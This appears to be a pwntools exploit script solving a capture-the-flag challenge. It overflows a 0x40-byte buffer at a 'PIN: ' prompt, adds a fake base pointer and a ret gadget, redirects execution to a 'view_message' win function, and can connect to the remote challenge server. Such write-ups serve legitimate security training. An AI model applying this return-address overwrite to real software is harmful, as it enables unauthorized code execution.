#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./distribution/chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc challs.nusgreyhats.org 30211"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""

win = elf.sym["view_message"]
ret = 0x00000000004017af

io = start()

payload = flat(b"A" * 0x40, elf.bss(0xc00), ret, win)
io.sendlineafter(b"PIN: ", payload)

io.interactive()
